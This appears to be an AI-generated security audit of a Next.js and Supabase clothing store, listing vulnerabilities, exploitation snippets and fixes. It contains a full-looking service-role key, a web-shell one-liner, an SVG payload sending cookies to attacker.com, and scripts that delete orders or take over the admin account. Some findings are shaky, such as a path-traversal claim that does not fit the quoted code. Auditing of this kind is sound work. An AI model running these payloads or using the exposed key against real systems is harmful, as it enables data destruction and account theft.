# 🔒 DORCY VOGUE E-COMMERCE SECURITY AUDIT REPORT
**Date:** August 12, 2026  
**Auditor:** AI Security Analysis  
**Severity Levels:** 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low

---

## 🔴 CRITICAL VULNERABILITIES

### 1. **EXPOSED SECRETS IN .env.local FILE**
**Location:** `.env.local`  
**Risk:** Complete system compromise, data breach, financial loss  
**Evidence:**
```
SUPABASE_SERVICE_ROLE_KEY=eyJhbGci... [REDACTED]
RESEND_API_KEY=re_XXXXX... [REDACTED]
ADMIN_RESET_SECRET=dv-reset-2026
```

**Impact:**
- Service role key grants **FULL DATABASE ACCESS** bypassing all RLS policies
- Attacker can read/modify/delete ALL orders, products, customer data
- Can send unlimited emails via Resend API (phishing, spam)
- Can reset admin password with exposed secret

**Exploitation:**
```javascript
// Attacker can execute this from anywhere:
const supabase = createClient(
  'https://fqtdhlbfsapkpgnxocpi.supabase.co',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' // Exposed service key
);
// Now has god-mode access to entire database
await supabase.from('orders').delete().neq('id', 0); // Delete all orders
await supabase.from('products').update({price: 0}).neq('id', 0); // Set all prices to 0
```

**Fix:**
1. **IMMEDIATELY** rotate all exposed secrets:
   - Generate new Supabase service role key
   - Generate new Resend API key
   - Change `ADMIN_RESET_SECRET` to a cryptographically random value
2. Add `.env.local` to `.gitignore` (check if already there)
3. Remove `.env.local` from git history using `git filter-repo` or BFG Repo-Cleaner
4. Use Vercel/hosting platform environment variables for production

---

### 2. **HARDCODED SECRETS IN SOURCE CODE**
**Locations:** 
- `src/app/api/upload-url/route.ts` (lines 19, 28-30)
- `src/app/api/upload-receipt/route.ts` (lines 18-19)
- `src/lib/supabase.ts` (lines 3-4)

**Risk:** Secrets visible in public GitHub repository, build artifacts, browser bundles  
**Evidence:**
```typescript
const supabaseServiceKey =
  process.env.SUPABASE_SERVICE_ROLE_KEY ||
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZxdGRobGJmc2Fwa3BnbnhvY3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MzE3ODI1NCwiZXhwIjoyMDk4NzU0MjU0fQ.s0JEDmQAaSFB3VUowJaauL1bXbJ_A69rcM7aZc0xT8Q";
```

**Impact:**
- Anyone viewing the GitHub repo gets full database access
- Secrets exposed in browser DevTools (for client-side code)
- Impossible to rotate secrets without code changes

**Fix:**
```typescript
// ❌ BAD
const key = process.env.SECRET || "hardcoded-fallback";

// ✅ GOOD
const key = process.env.SECRET;
if (!key) {
  throw new Error("SECRET environment variable must be set");
}
```

**Action Items:**
1. Remove ALL hardcoded fallback secrets from source code
2. Make environment variables mandatory with runtime checks
3. Rotate all exposed keys immediately
4. Scan git history for committed secrets using `trufflehog` or `gitleaks`

---

### 3. **WEAK ADMIN RESET SECRET**
**Location:** `src/app/api/admin-reset-password/route.ts`  
**Risk:** Account takeover, unauthorized admin access  
**Evidence:**
```typescript
const RESET_SECRET = process.env.ADMIN_RESET_SECRET || "dv-reset-2026";
```

**Impact:**
- Predictable secret can be brute-forced or guessed
- No rate limiting on reset endpoint
- Anyone with this secret can reset admin password

**Attack Vector:**
```bash
curl -X POST https://dorcyvogue.com/api/admin-reset-password \
  -H "Content-Type: application/json" \
  -d '{"secret":"dv-reset-2026","password":"hacker123"}'
# Admin account compromised
```

**Fix:**
1. Generate cryptographically secure secret: `openssl rand -hex 32`
2. Implement rate limiting (max 3 attempts per hour per IP)
3. Add email verification step
4. Log all reset attempts with IP addresses
5. Use short-lived, single-use tokens instead of static secrets

---

## 🟠 HIGH VULNERABILITIES

### 4. **UNRESTRICTED FILE UPLOAD**
**Location:** `src/app/api/upload-receipt/route.ts`  
**Risk:** Malware distribution, server compromise, XSS via SVG  
**Evidence:**
```typescript
// No file type validation beyond client-side accept attribute
const file = formData.get("file") as File | null;
// Directly uploads to public storage
await supabaseAdmin.storage.from("receipts").upload(filePath, buffer, {
  contentType: file.type, // Trusts client-provided MIME type
});
```

**Vulnerabilities:**
1. **No server-side file type validation**
2. **No magic number/signature checking**
3. **Trusts client-provided `file.type`** (easily spoofed)
4. **Files stored in public bucket** accessible to anyone
5. **No malware scanning**

**Exploitation:**
```javascript
// Attacker uploads malicious PHP file as JPG
const blob = new Blob(['<?php system($_GET["cmd"]); ?>'], {type: 'image/jpeg'});
const file = new File([blob], 'shell.php.jpg');
formData.append('file', file);
// If Supabase serves this file, attacker can execute commands
```

**SVG XSS Attack:**
```xml
<!-- malicious.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
```

**Fix:**
```typescript
import { fileTypeFromBuffer } from 'file-type';

// 1. Validate file signature (magic numbers)
const arrayBuffer = await file.arrayBuffer();
const buffer = Buffer.from(arrayBuffer);
const fileType = await fileTypeFromBuffer(buffer);

const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
if (!fileType || !allowedTypes.includes(fileType.mime)) {
  return NextResponse.json({ error: "Invalid file type" }, { status: 400 });
}

// 2. Sanitize filename
const sanitizedExt = fileType.ext;
const safeFileName = `${orderId}_${Date.now()}.${sanitizedExt}`;

// 3. Set proper Content-Security-Policy headers
// 4. Store files in private bucket, serve via signed URLs with short expiration
// 5. Consider integrating virus scanning (ClamAV, VirusTotal API)
```

---

### 5. **NO CSRF PROTECTION**
**Location:** All API routes  
**Risk:** Cross-site request forgery, unauthorized actions  
**Evidence:** No CSRF tokens found in any API route

**Attack Scenario:**
```html
<!-- Attacker's website -->
<form action="https://dorcyvogue.com/api/upload-receipt" method="POST" id="evil">
  <input type="hidden" name="orderId" value="victim-order-123">
  <input type="file" name="file">
</form>
<script>
  // Victim visits attacker site while logged into Dorcy Vogue
  document.getElementById('evil').submit();
  // Receipt uploaded to victim's order without consent
</script>
```

**Fix:**
```typescript
// Use Next.js middleware for CSRF protection
import { createCsrfProtection } from 'edge-csrf';

const csrfProtect = createCsrfProtection({
  cookie: {
    secure: process.env.NODE_ENV === 'production',
  },
});

export async function POST(req: NextRequest) {
  const csrfError = await csrfProtect(req);
  if (csrfError) {
    return NextResponse.json({ error: 'Invalid CSRF token' }, { status: 403 });
  }
  // ... rest of handler
}
```

---

### 6. **PATH TRAVERSAL IN FILE UPLOAD**
**Location:** `src/app/api/upload-url/route.ts`  
**Risk:** Overwrite system files, unauthorized access  
**Evidence:**
```typescript
const safeExt = String(ext || "bin").toLowerCase().replace(/[^a-z0-9]/g, "").slice(0, 5) || "bin";
const path = `products/${Date.now()}_${Math.random().toString(36).substring(2, 8)}.${safeExt}`;
```

**Vulnerability:** While `ext` is sanitized, there's no validation that the bucket parameter is controlled

**Exploitation:**
```javascript
// Malicious request
await fetch('/api/upload-url', {
  method: 'POST',
  body: JSON.stringify({
    bucket: '../../../etc',
    ext: 'passwd'
  })
});
```

**Fix:**
```typescript
// Whitelist buckets
const ALLOWED_BUCKETS = ['product-images', 'product-videos', 'receipts'];
if (!ALLOWED_BUCKETS.includes(bucket)) {
  return NextResponse.json({ error: "Invalid bucket" }, { status: 400 });
}
```

---

## 🟡 MEDIUM VULNERABILITIES

### 7. **NO RATE LIMITING**
**Location:** All API endpoints  
**Risk:** Brute force attacks, DDoS, resource exhaustion  
**Impact:**
- Brute force admin password reset
- Spam file uploads (storage costs)
- Email bombing via `/api/notify-admin`

**Fix:**
```typescript
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '10 s'), // 10 requests per 10 seconds
});

export async function POST(req: NextRequest) {
  const ip = req.headers.get('x-forwarded-for') || 'unknown';
  const { success } = await ratelimit.limit(ip);
  
  if (!success) {
    return NextResponse.json({ error: 'Too many requests' }, { status: 429 });
  }
  // ... rest of handler
}
```

---

### 8. **MISSING INPUT VALIDATION**
**Location:** `src/app/admin/orders/page.tsx` date inputs  
**Risk:** Logic bugs, data corruption  
**Evidence:**
```typescript
// No validation that DD.MM.YYYY is a valid date
const handleDateChange = (val: string, setter: (v: string) => void) => {
  const formatted = formatDateInput(val);
  setter(formatted);
};
```

**Attack:**
```
Input: "99.99.9999" → Formatted: "99.99.9999" → Invalid date passed to backend
```

**Fix:**
```typescript
const validateDate = (dateStr: string): boolean => {
  const [dd, mm, yyyy] = dateStr.split('.').map(Number);
  if (!yyyy || yyyy < 1900 || yyyy > 2100) return false;
  if (!mm || mm < 1 || mm > 12) return false;
  
  const daysInMonth = new Date(yyyy, mm, 0).getDate();
  if (!dd || dd < 1 || dd > daysInMonth) return false;
  
  return true;
};

// In handleDateChange:
if (formatted.length === 10 && !validateDate(formatted)) {
  alert('Invalid date. Please enter a valid date in DD.MM.YYYY format.');
  return;
}
```

---

### 9. **INSUFFICIENT SESSION MANAGEMENT**
**Location:** `src/app/admin/layout.tsx`  
**Risk:** Session hijacking, concurrent session abuse  
**Issues:**
1. Sessions stored in `sessionStorage` (not httpOnly)
2. No session expiration check
3. No concurrent session detection
4. Force logout polls every 5 seconds (slow reaction)

**Fix:**
```typescript
// Use Supabase built-in session management
const { data: { session } } = await supabase.auth.getSession();

if (!session || new Date(session.expires_at!) < new Date()) {
  // Session expired
  router.replace('/admin/login');
}

// Listen to real-time auth events
supabase.auth.onAuthStateChange((event, session) => {
  if (event === 'SIGNED_OUT') {
    router.replace('/admin/logged-out');
  }
});
```

---

### 10. **INFORMATION DISCLOSURE**
**Location:** Error messages in API routes  
**Risk:** Information leakage aids attackers  
**Evidence:**
```typescript
return NextResponse.json({ error: `Could not create storage bucket: ${createError.message}` }, { status: 500 });
```

**Fix:**
```typescript
// ❌ BAD - Exposes internal error details
return NextResponse.json({ error: error.message }, { status: 500 });

// ✅ GOOD - Generic message, log details server-side
console.error('Storage error:', error);
return NextResponse.json({ error: "Failed to process upload" }, { status: 500 });
```

---

## 🟢 LOW VULNERABILITIES / BEST PRACTICES

### 11. **Missing Security Headers**
Add to `next.config.ts`:
```typescript
async headers() {
  return [
    {
      source: '/(.*)',
      headers: [
        {
          key: 'X-Frame-Options',
          value: 'DENY'
        },
        {
          key: 'X-Content-Type-Options',
          value: 'nosniff'
        },
        {
          key: 'Referrer-Policy',
          value: 'strict-origin-when-cross-origin'
        },
        {
          key: 'Permissions-Policy',
          value: 'camera=(), microphone=(), geolocation=()'
        },
        {
          key: 'Content-Security-Policy',
          value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline';"
        }
      ]
    }
  ];
}
```

---

### 12. **Outdated Dependencies**
Run regular security audits:
```bash
npm audit fix
npm outdated
```

---

### 13. **No Request Logging**
Implement logging for security monitoring:
```typescript
// middleware.ts
export function middleware(request: NextRequest) {
  console.log({
    timestamp: new Date().toISOString(),
    method: request.method,
    url: request.url,
    ip: request.headers.get('x-forwarded-for'),
    userAgent: request.headers.get('user-agent')
  });
}
```

---

## 📋 IMMEDIATE ACTION PLAN (Priority Order)

### 🔴 CRITICAL - DO IMMEDIATELY (Today)
1. ✅ **Rotate ALL exposed secrets**
   - New Supabase service role key
   - New Resend API key
   - New admin reset secret (use `openssl rand -hex 32`)
2. ✅ **Remove .env.local from git**
   ```bash
   git rm --cached .env.local
   echo ".env.local" >> .gitignore
   git add .gitignore
   git commit -m "Remove exposed secrets"
   git push --force
   ```
3. ✅ **Remove hardcoded secrets from source code**
   - Delete all `|| "hardcoded-fallback"` patterns
   - Add runtime checks for required env vars
4. ✅ **Make secrets storage private on Supabase**
   - Change `receipts` bucket to private
   - Serve via signed URLs with 1-hour expiration

### 🟠 HIGH - DO THIS WEEK
5. ✅ **Implement file upload validation**
   - Install `file-type` package
   - Validate magic numbers
   - Whitelist MIME types
6. ✅ **Add CSRF protection**
   - Install `edge-csrf`
   - Apply to all mutating endpoints
7. ✅ **Implement rate limiting**
   - Use Vercel Edge Config or Upstash Redis
   - Apply to authentication endpoints first

### 🟡 MEDIUM - DO THIS MONTH
8. ✅ **Add security headers**
9. ✅ **Implement proper session management**
10. ✅ **Add input validation**
11. ✅ **Set up error logging** (Sentry, LogRocket, etc.)
12. ✅ **Conduct dependency audit**

### 🟢 LOW - ONGOING
13. ✅ **Set up automated security scanning** (Snyk, Dependabot)
14. ✅ **Implement request logging**
15. ✅ **Set up monitoring & alerts**
16. ✅ **Regular security audits** (quarterly)

---

## 🛡️ SECURITY CHECKLIST FOR FUTURE DEVELOPMENT

- [ ] Never commit `.env` files
- [ ] Never hardcode secrets in source code
- [ ] Validate all user inputs (client AND server)
- [ ] Use parameterized queries (Supabase does this by default)
- [ ] Implement rate limiting on all endpoints
- [ ] Add CSRF tokens to forms
- [ ] Validate file types by magic numbers, not extension
- [ ] Store sensitive files in private buckets
- [ ] Use HTTPS everywhere (enforced by Vercel)
- [ ] Implement proper session management
- [ ] Log security events
- [ ] Keep dependencies updated
- [ ] Principle of least privilege (RLS policies)
- [ ] Defense in depth (multiple security layers)

---

## 📞 CONTACT & NEXT STEPS

**Critical Finding:** Your Supabase service role key and Resend API key are publicly exposed in the GitHub repository. This needs immediate action.

**Recommended Next Steps:**
1. Follow the immediate action plan above
2. Consider hiring a security consultant for penetration testing
3. Implement Web Application Firewall (Cloudflare, AWS WAF)
4. Set up bug bounty program once critical issues are fixed
5. Conduct security training for development team

**Resources:**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/configuring/security-headers)
- [Supabase Security Guide](https://supabase.com/docs/guides/auth/auth-deep-dive)

---

**Report Generated:** August 12, 2026  
**Status:** ⚠️ CRITICAL VULNERABILITIES FOUND  
**Recommendation:** Immediate remediation required before production deployment
